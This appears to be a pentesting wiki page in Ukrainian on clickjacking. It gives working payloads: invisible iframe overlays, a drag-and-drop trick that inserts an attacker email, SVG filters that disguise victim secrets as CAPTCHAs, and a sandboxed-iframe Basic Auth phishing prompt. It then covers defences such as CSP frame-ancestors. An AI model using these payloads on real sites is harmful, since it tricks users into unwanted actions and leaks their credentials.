# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Що таке Clickjacking

У clickjacking-атакі **користувача** обманом змушують **натискати** на **елемент** на веб-сторінці, який є або **невидимим**, або замаскований під інший елемент. Така маніпуляція може призвести до небажаних наслідків для користувача, наприклад завантаження malware, перенаправлення на зловмисні веб-сторінки, передача облікових даних або конфіденційної інформації, перекази грошей або онлайн-покупки товарів.

### Трюк із попереднім заповненням форм

Іноді можливо **заповнити значення полів форми, використовуючи GET-параметри під час завантаження сторінки**. Атакуючий може зловживати цією поведінкою, щоб заповнити форму довільними даними та надіслати clickjacking payload, щоб користувач натиснув кнопку Submit.

### Заповнення форми за допомогою Drag\&Drop

Якщо вам потрібно, щоб **користувач заповнив форму**, але ви не хочете прямо просити його ввести певну інформацію (наприклад email або конкретний пароль, який ви знаєте), ви можете просто попросити його **Drag\&Drop** чогось, що запише ваші контрольовані дані, як у [**цьому прикладі**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Багатокроковий Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Якщо ви виявили **XSS**, який вимагає, щоб користувач натиснув на якийсь елемент, щоб **trigger** XSS, і сторінка **vulnerable to clickjacking**, ви можете зловживати цим, щоб обдурити користувача й змусити його натиснути кнопку/посилання.\
Приклад:\
Ви знайшли **self XSS** у деяких приватних даних акаунта (дані, які **тільки ви можете встановлювати і читати**). Сторінка з **form** для встановлення цих даних є **vulnerable** до **Clickjacking**, і ви можете **prepopulate** цей **form** за допомогою GET parameters.\
Атакуючий може підготувати атаку **Clickjacking** на цю сторінку, **prepopulating** **form** з **XSS payload** та **tricking** **user**, щоб він **Submit** форму. Тому, **when the form is submitted** і значення будуть змінені, **user will execute the XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), ця техніка просить victim зробити подвійний клік по кнопці кастомної сторінки, розміщеній у певному місці, і використовує різницю в таймінгу між подіями mousedown та onclick, щоб під час double click завантажити сторінку жертви так, що **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Ця техніка дозволяє обдурити користувача, щоб він клікнув в одне місце на сторінці жертви, обходячи всі захисти від clickjacking. Тому атакуючому потрібно знайти **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds let CSS `filter:url(#id)` be applied to cross-origin iframes. The iframe’s rasterized pixels are exposed to the SVG filter graph as `SourceGraphic`, so primitives such as `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. can arbitrarily warp the victim UI before the user sees it, even though the attacker never touches the DOM. A simple Liquid-Glass style filter looks like:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Корисні примітиви: `feImage` завантажує attacker bitmaps (e.g., overlays, displacement maps); `feFlood` будує constant-color mattes; `feOffset/feGaussianBlur` уточнюють highlights; `feDisplacementMap` заломлює/деформує текст; `feComposite operator="arithmetic"` реалізує довільну поканальну математику (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), чого достатньо для contrast boosting, masking, and AND/OR operations; `feTile` обрізає і реплікує pixel probes; `feMorphology` збільшує/зменшує strokes; `feColorMatrix` переміщує luma в alpha для побудови точних masks.

#### Спотворення секретів у підказки типу CAPTCHA

Якщо framable endpoint відображає секрети (tokens, reset codes, API keys), атакуючий може спотворити їх так, щоб вони нагадували CAPTCHA, і примусити до ручної транскрипції:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
The distorted pixels fool the user into “solving” the captcha inside the attacker-controlled `<input>` whose `pattern` enforces the real victim secret.

#### Реконтекстуалізація введення жертви

Фільтри можуть хірургічно видаляти placeholder/validation текст, одночасно зберігаючи натискання клавіш користувача. Один робочий процес:

1. `feComposite operator="arithmetic" k2≈4` підсилює яскравість так, що сілий helper text насичується до білого.
2. `feTile` обмежує робочу область до прямокутника `<input>`.
3. `feMorphology operator="erode"` згущує темні гліфи, набрані жертвою, і зберігає їх у `result="thick"`.
4. `feFlood` створює білу підкладку, `feBlend mode="difference"` з `thick`, а другий `feComposite k2≈100` перетворює це на різку luma matte.
5. `feColorMatrix` переносить цю luma в альфу, а `feComposite in="SourceGraphic" operator="in"` залишає лише гліфи, введені користувачем.
6. Ще один `feBlend in2="white"` плюс тонке обрізання дає чисте текстове поле, після чого атакуючий накладає власні HTML-мітки (наприклад, “Enter your email”), тоді як прихований iframe все ще примушує політику паролів походження жертви.

Safari має проблеми з `feTile`; той самий ефект можна відтворити за допомогою просторових маттів, побудованих з `feFlood` + `feColorMatrix` + `feComposite` для WebKit-only payloads.

#### Піксельні зонди, логіка та автомати станів

Обрізавши область 2–4 px за допомогою `feTile` і замостивши її на `100%` області перегляду, атакуючий перетворює вибраний колір у текстуру на весь кадр, яку можна порогово перетворити в булеву маску:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
Для довільних кольорів, посилання `feFlood` (наприклад, `#0B57D0`) разом з `feBlend mode="difference"` і іншим арифметичним composite (`k2≈100`, `k4` як tolerance) дає білий вихід лише тоді, коли відфільтрований піксель збігається з цільовим відтінком. Передача цих масок у `feComposite` з налаштованими `k1..k4` дає логічні вентилі: `AND` через `k1=1`, `OR` через `k2=k3=1`, `XOR` через `feBlend mode="difference"`, `NOT` через змішування з білим. Послідовне з’єднання вентилів створює повний суматор всередині графа фільтрів, доводячи функціональну повноту конвеєра.

Отже, атакуючі можуть читати стан UI без JavaScript. Приклади булевих станів з модального workflow:

- **D** (dialog visible): опитати затемнений кут і перевірити проти білого.
- **L** (dialog loaded): опитати координати, де кнопка з’являється, коли вона готова.
- **C** (checkbox checked): порівняти піксель чекбокса з активним синім `#0B57D0`.
- **R** (red success/failure banner): використати `feMorphology` і пороги червоного всередині прямокутника банера.

Кожен виявлений стан відкриває різний накладний bitmap, вбудований через `feImage xlink:href="data:..."`. Маскування цих bitmap за допомогою `D`, `L`, `C`, `R` синхронізує оверлеї з реальним діалогом і проводить жертву через багатокрокові workflows (password resets, approvals, destructive confirmations), ніколи не відкриваючи DOM.

### Sandboxed iframe Basic Auth dialog (no allow-popups)

Песочницевий iframe без `allow-popups` все ще може викликати браузерний **HTTP Basic Authentication modal**, коли запит повертає `401` з `WWW-Authenticate`. Діалог породжується мережею/auth-шаром браузера (не JS `alert/prompt/confirm`), тому обмеження попапів у sandbox **не** підтискають його. Якщо ви можете скриптувати iframe (наприклад, `sandbox="allow-scripts"`), ви можете перенаправити його до будь-якої кінцевої точки, що видає Basic Auth challenge:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Як тільки приходить відповідь, браузер запитує облікові дані, навіть якщо спливаючі вікна заборонені. Обрамлення довіреного origin цим трюком дозволяє UI redress/phishing: непередбачувані модальні запити всередині "sandboxed" віджета можуть збити з пантелику користувачів або змусити password managers запропонувати збережені облікові дані.

### Розширення браузера: DOM-based autofill clickjacking

Окрім iframing сторінок жертви, нападники можуть націлюватися на UI-елементи browser extension, які інжектяться в сторінку. Password managers відображають autofill dropdown поруч із сфокусованими полями вводу; сфокусувавши поле, яким керує нападник, та сховавши/закривши випадачку розширення (opacity/overlay/top-layer tricks), примусовий клік користувача може вибрати збережений елемент і заповнити чутливі дані в полях, контрольованих нападником. Ця варіація не потребує exposure iframe і працює повністю через DOM/CSS manipulation.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Стратегії захисту від Clickjacking

### Захист на стороні клієнта

Скрипти, що виконуються на стороні клієнта, можуть виконувати дії для запобігання Clickjacking:

- Переконання, що вікно застосунку є головним або верхнім (main or top window).
- Робити всі фрейми видимими.
- Перешкоджати клікам по невидимих фреймах.
- Виявлення та оповіщення користувачів про можливі спроби Clickjacking.

Однак ці frame-busting скрипти можна обійти:

- **Налаштування безпеки браузерів:** Деякі браузери можуть блокувати ці скрипти залежно від своїх налаштувань безпеки або через відсутність підтримки JavaScript.
- **HTML5 iframe `sandbox` Attribute:** Зловмисник може нейтралізувати frame buster скрипти, встановивши атрибут `sandbox` зі значеннями `allow-forms` або `allow-scripts` без `allow-top-navigation`. Це заважає iframe перевірити, чи є він верхнім вікном, наприклад,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### Захист на стороні сервера

#### X-Frame-Options

The **`X-Frame-Options` HTTP response header** informs browsers about the legitimacy of rendering a page in a `<frame>` or `<iframe>`, helping to prevent Clickjacking:

- `X-Frame-Options: deny` - Жоден домен не може відобразити вміст у фреймі.
- `X-Frame-Options: sameorigin` - Лише поточний сайт може відображати вміст у фреймі.
- `X-Frame-Options: allow-from https://trusted.com` - Лише вказаний 'uri' може відображати сторінку у фреймі.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Директива frame-ancestors в Content Security Policy (CSP)

**`frame-ancestors` directive in CSP** is the advised method for Clickjacking protection:

- `frame-ancestors 'none'` - Аналогічно до `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Аналогічно до `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Аналогічно до `X-Frame-Options: allow-from`.

For instance, the following CSP only allows framing from the same domain:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)** is a security measure that helps in preventing Clickjacking and other code injection attacks by specifying which sources the browser should allow to load content.

#### `frame-src` директива

- Визначає допустимі джерела для фреймів.
- Більш специфічна, ніж директива `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ця політика дозволяє фрейми з того ж походження (self) та https://trusted-website.com.

#### `child-src` Директива

- Запроваджена в CSP level 2 для налаштування допустимих джерел для web workers і frames.
- Виступає як резервний варіант для frame-src і worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ця політика дозволяє frames і workers з того самого походження (self) та https://trusted-website.com.

**Примітки щодо використання:**

- Виведення з експлуатації: child-src поступово замінюється на frame-src і worker-src.
- Поведінка при відсутності: Якщо frame-src відсутній, child-src використовується як запасний варіант для фреймів. Якщо обидва відсутні, використовується default-src.
- Жорстке визначення джерел: включайте лише довірені джерела в директиви, щоб запобігти експлуатації.

#### JavaScript Frame-Breaking Scripts

Хоча це не дає повного захисту, JavaScript-based frame-busting scripts можна використовувати для запобігання відображенню веб-сторінки у фреймі. Приклад:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Використання Anti-CSRF Tokens

- **Token Validation:** Використовуйте anti-CSRF tokens у веб-застосунках, щоб переконатися, що запити, які змінюють стан, виконуються навмисно користувачем, а не через Clickjacked сторінку.

## Посилання

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
